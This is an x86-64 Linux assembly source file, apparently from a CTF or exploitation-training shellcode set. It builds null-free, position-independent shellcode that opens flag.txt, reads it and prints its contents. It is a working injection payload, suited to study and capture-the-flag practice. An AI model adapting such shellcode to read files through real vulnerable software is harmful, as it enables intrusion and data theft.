; src/shellcode/readflag.asm
; ---------------------------------------------------------------------------
; open("flag.txt", O_RDONLY) -> read -> write(stdout). x86-64 Linux.
; Position-independent, null-byte free.
; Demonstrates the open/read/write syscall path (distinct from execve.asm).
; ---------------------------------------------------------------------------
; Build:  make            # -> bin/readflag, bin/readflag.bin
; Run:    place ./flag.txt, then execute; its contents are printed to stdout.
; ---------------------------------------------------------------------------

global _start

section .text
_start:
    ; --- open("flag.txt", O_RDONLY) ---
    xor     rax, rax
    push    rax                     ; 8 zero bytes -> null terminator
    mov     rax, 0x7478742e67616c66 ; "flag.txt" (8 bytes, no embedded null)
    push    rax
    mov     rdi, rsp                ; path -> "flag.txt\0"
    xor     rsi, rsi                ; flags = O_RDONLY (0)
    xor     rdx, rdx                ; mode  = 0
    xor     rax, rax
    mov     al, 2                   ; syscall 2 = open   (NOT mov eax,2 -> nulls)
    syscall                         ; rax = fd

    ; --- read(fd, stack_buf, 64) ---
    mov     rdi, rax                ; fd
    sub     rsp, 0x40               ; reserve a 64-byte stack buffer
    mov     rsi, rsp                ; buf
    xor     rdx, rdx
    mov     dl, 0x40                ; count = 64
    xor     rax, rax                ; syscall 0 = read
    syscall                         ; rax = bytes read

    ; --- write(1, buf, bytes_read) ---
    mov     rdx, rax                ; count = bytes read
    xor     rdi, rdi
    inc     rdi                     ; fd = 1 (stdout)   (inc, not mov 1 -> nulls)
    ; rsi already points at buf
    xor     rax, rax
    mov     al, 1                   ; syscall 1 = write
    syscall

    ; --- exit(0) ---
    xor     rdi, rdi
    xor     rax, rax
    mov     al, 60                  ; syscall 60 = exit
    syscall
